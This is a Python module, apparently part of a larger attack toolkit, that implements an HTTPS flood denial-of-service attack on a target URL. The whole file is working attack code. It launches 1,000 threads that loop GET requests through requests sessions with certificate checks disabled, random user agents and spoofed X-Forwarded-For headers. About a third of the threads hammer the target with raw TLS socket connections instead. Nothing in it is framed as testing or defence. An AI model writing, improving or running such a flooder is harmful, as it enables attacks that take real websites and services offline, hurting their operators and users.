"""
HTTPS Flood Attack Handler
"""

import requests
import threading
import time
import random
import ssl
import socket
from urllib.parse import urlparse

class HTTPSFlood:
    def __init__(self):
        self.name = "HTTPS FLOOD"
        self.running = False
        self.stats = {
            'packets': 0,
            'errors': 0,
            'threads': 0
        }
        self.target = None
        self.threads = []
        self.target_ip = None
        self.target_port = 443
        
        # Disable SSL warnings
        requests.packages.urllib3.disable_warnings()
    
    def resolve_target(self, target):
        """Extract IP from URL"""
        from urllib.parse import urlparse
        parsed = urlparse(target)
        hostname = parsed.netloc.split(':')[0]
        
        try:
            self.target_ip = socket.gethostbyname(hostname)
        except:
            self.target_ip = hostname
    
    def get_headers(self):
        """Generate random headers"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15'
        ]
        
        return {
            'User-Agent': random.choice(user_agents),
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        }
    
    def ssl_worker(self, worker_id, threads_per_sec):
        """HTTPS flood using raw sockets"""
        while self.running:
            try:
                # Create SSL context
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                
                # Create socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                
                # Connect
                sock.connect((self.target_ip, self.target_port))
                
                # Wrap with SSL
                ssl_sock = context.wrap_socket(sock, server_hostname=self.target_ip)
                
                # Send HTTP request
                request = f"GET / HTTP/1.1\r\nHost: {self.target_ip}\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
                ssl_sock.send(request.encode())
                
                self.stats['packets'] += 1
                ssl_sock.close()
                
                if threads_per_sec > 0:
                    time.sleep(1.0 / threads_per_sec)
                
            except Exception:
                self.stats['errors'] += 1
    
    def http_worker(self, worker_id, threads_per_sec):
        """HTTPS flood using requests library"""
        local_session = requests.Session()
        local_session.verify = False
        
        while self.running:
            try:
                response = local_session.get(
                    self.target,
                    headers=self.get_headers(),
                    timeout=2
                )
                
                self.stats['packets'] += 1
                
                if threads_per_sec > 0:
                    time.sleep(1.0 / threads_per_sec)
                
            except Exception:
                self.stats['errors'] += 1
                local_session = requests.Session()
                local_session.verify = False
    
    def start(self, target, threads_config, main_tool):
        """Start HTTPS flood attack"""
        self.running = True
        self.target = target
        self.resolve_target(target)
        
        print(f"\n{self.name} attack started on {target}")
        
        threads_per_sec = threads_config
        worker_count = 1000
        
        if threads_per_sec == 0:
            thread_delay = 0
        else:
            thread_delay = 1.0 / threads_per_sec
        
        # Start mixed workers (70% requests, 30% raw sockets)
        for i in range(worker_count):
            if not self.running:
                break
            
            if i % 3 == 0:
                thread = threading.Thread(
                    target=self.ssl_worker,
                    args=(i, threads_per_sec)
                )
            else:
                thread = threading.Thread(
                    target=self.http_worker,
                    args=(i, threads_per_sec)
                )
            
            thread.daemon = True
            thread.start()
            self.threads.append(thread)
            self.stats['threads'] = len(self.threads)
            
            if thread_delay > 0:
                time.sleep(thread_delay)
        
        while self.running and main_tool.running:
            time.sleep(1)
    
    def stop(self):
        """Stop HTTPS flood"""
        self.running = False
    
    def get_stats(self):
        """Get current statistics"""
        return self.stats
